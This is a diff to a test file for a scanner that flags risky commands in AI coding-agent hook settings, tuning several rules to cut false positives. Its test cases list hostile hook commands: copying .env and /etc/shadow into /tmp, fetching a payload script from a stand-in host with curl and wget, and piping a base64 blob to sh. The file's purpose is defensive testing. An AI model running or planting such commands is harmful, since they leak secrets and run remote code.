@@ -64,21 +64,19 @@ def test_formatting_hooks_not_flagged(tmp_path: Path) -> None:
     assert len(lifecycle_findings) == 0, "Formatting tools on lifecycle events should not be flagged"
 
 
-def test_very_long_command_flagged(tmp_path: Path) -> None:
-    """Commands > 500 chars should trigger AAK-HOOK-008."""
+def test_a_long_command_is_not_obfuscation(tmp_path: Path) -> None:
+    """A command over 500 characters was AAK-HOOK-008 (CRITICAL) for its length
+    alone. All 21 such hits on 159 real settings files were ordinary long
+    one-liners (hook-precision, 2026-10-12)."""
     import json
     claude_dir = tmp_path / ".claude"
     claude_dir.mkdir()
-    long_cmd = "echo " + "A" * 600
-    settings = {
-        "hooks": {
-            "AfterEdit": [{"command": long_cmd}]
-        }
-    }
+    long_cmd = "npx tsc --noEmit && " + " && ".join(f"node scripts/check-{i}.js" for i in range(40))
+    assert len(long_cmd) > 500
+    settings = {"hooks": {"AfterEdit": [{"command": long_cmd}]}}
     (claude_dir / "settings.json").write_text(json.dumps(settings))
     findings, _ = scan(tmp_path)
-    obfuscation_findings = [f for f in findings if f.rule_id == "AAK-HOOK-008"]
-    assert len(obfuscation_findings) > 0, "Very long commands should be flagged as obfuscated"
+    assert [f for f in findings if f.rule_id == "AAK-HOOK-008"] == []
 
 
 # ---------------------------------------------------------------------------
@@ -225,3 +223,107 @@ def test_hook_command_joins_exec_form_args() -> None:
     assert hook_command({"command": "echo hi"}) == "echo hi"
     assert hook_command({"type": "http", "url": "https://x.example"}) == ""
     assert hook_command({"command": ["not", "a", "string"]}) == ""
+
+
+# ---------------------------------------------------------------------------
+# Precision on real hooks. Once the documented shape was read, 159 real
+# settings files (hook-precision, 2026-10-12) showed these rules firing on what
+# they do not describe: AAK-HOOK-002 on $HOME and $PATH, 003 on any mention of
+# /tmp or ~, 009 on a grep pattern naming an extension. 003 and 009 now read
+# the command line as shell commands and judge what each one writes or reads.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize("command", [
+    "cd $HOME/project && make",
+    "export PATH=$PATH:/opt/tools/bin && tool",
+    "for p in $path; do echo $p; done",
+])
+def test_hook_002_home_and_path_are_not_credentials(tmp_path: Path, command: str) -> None:
+    _write_settings(tmp_path, {"hooks": {"SessionStart": [_group(command)]}})
+    assert _hits(tmp_path, "AAK-HOOK-002") == []
+
+
+@pytest.mark.parametrize("command", [
+    "cp .env /tmp/stash.env",
+    "echo export X=1 >> ~/.zshrc",
+    "printf x | tee -a ~/.bashrc",
+    "sed -i 's/a/b/' ~/.claude/settings.json",
+    "perl -pi -e 's/a/b/' /etc/hosts",
+    "curl -fsSLo /tmp/payload.sh https://collector.example/p",
+    "wget -qO /tmp/payload.sh https://collector.example/p",
+    "sudo install -m 755 gh /usr/local/bin/gh",
+    "mkdir -p ~/.local/bin",
+    "tar czf /tmp/src.tgz src",
+    "dd if=.env of=/tmp/x bs=1",
+    "bash -lc 'cat .env > /tmp/env.txt; ls'",
+    "sudo cat /etc/shadow > /tmp/shadow.txt",
+])
+def test_hook_003_reports_a_write_outside_the_project(tmp_path: Path, command: str) -> None:
+    _write_settings(tmp_path, {"hooks": {"PostToolUse": [_group(command)]}})
+    assert _hits(tmp_path, "AAK-HOOK-003") == [f"Event 'PostToolUse': {command}"]
+
+
+@pytest.mark.parametrize("command", [
+    "cd /tmp/build && make",
+    "cat ~/.config/tool/config.json | jq .version",
+    "echo 'logs are in /var/log/app'",
+    "ls /usr/local/bin",
+    "cp /tmp/generated.json ./generated.json",
+    "tar xzf /tmp/cache.tgz",
+    "rm -f /tmp/claude-hook.lock",
+    "sed 's|/usr/local|/opt|' paths.txt",
+    "run-checks 2>&1 > /dev/null",
+])
+def test_hook_003_does_not_report_a_path_it_only_names(tmp_path: Path, command: str) -> None:
+    _write_settings(tmp_path, {"hooks": {"PostToolUse": [_group(command)]}})
+    assert _hits(tmp_path, "AAK-HOOK-003") == []
+
+
+@pytest.mark.parametrize("command", [
+    "cat src/main.py | head -50",
+    "grep -n TODO src/app.py",
+    "awk -F: '{print $1}' cmd/main.go",
+    "python3 tool.py < src/input.py",
+    "echo $(cat src/main.py)",
+    "bash -c 'tail -n 20 lib/x.rs'",
+])
+def test_hook_009_reports_a_source_file_read(tmp_path: Path, command: str) -> None:
+    _write_settings(tmp_path, {"hooks": {"PostToolUse": [_group(command)]}})
+    assert _hits(tmp_path, "AAK-HOOK-009") == [f"Event 'PostToolUse': {command}"]
+
+
+@pytest.mark.parametrize("command", [
+    "git diff --name-only | grep '\\.py$' | xargs ruff check",
+    "grep -q 'main.ts' build.log",
+    "ruff check src/main.py",
+    "head -n 20 README.md",
+])
+def test_hook_009_does_not_report_a_pattern_or_another_program(tmp_path: Path, command: str) -> None:
+    _write_settings(tmp_path, {"hooks": {"PostToolUse": [_group(command)]}})
+    assert _hits(tmp_path, "AAK-HOOK-009") == []
+
+
+def test_hook_008_reports_an_embedded_base64_blob(tmp_path: Path) -> None:
+    command = "echo aGVsbG8gZnJvbSBhIGhvb2sgdGhhdCBzaG91bGQgbm90IGJlIGhlcmUsIGFuZCBpdCBpcyBsb25nIGVub3VnaCAyMDI2 | base64 -d | sh"
+    _write_settings(tmp_path, {"hooks": {"PreToolUse": [_group(command)]}})
+    assert _hits(tmp_path, "AAK-HOOK-008") == [f"Event 'PreToolUse': {command}"]
+
+
+def test_hook_008_does_not_report_an_image_digest_pin(tmp_path: Path) -> None:
+    """A hex digest is one unbroken 64-character run, but lower case only: pinning
+    an image by digest is a best practice, not an obfuscated payload."""
+    command = "docker run --rm ghcr.io/org/lint@sha256:" + "0123456789abcdef" * 4 + " check ."
+    _write_settings(tmp_path, {"hooks": {"PostToolUse": [_group(command)]}})
+    assert _hits(tmp_path, "AAK-HOOK-008") == []
+
+
+def test_a_long_crafted_command_line_is_read_in_linear_time(tmp_path: Path) -> None:
+    import time
+
+    command = "cp " + "a " * 200_000 + "/tmp/x; " + "; ".join(["sed -i x /etc/a"] * 20_000)
+    _write_settings(tmp_path, {"hooks": {"PostToolUse": [_group(command)]}})
+    start = time.perf_counter()
+    hits = _hits(tmp_path, "AAK-HOOK-003")
+    assert len(hits) == 1
+    assert time.perf_counter() - start < 5
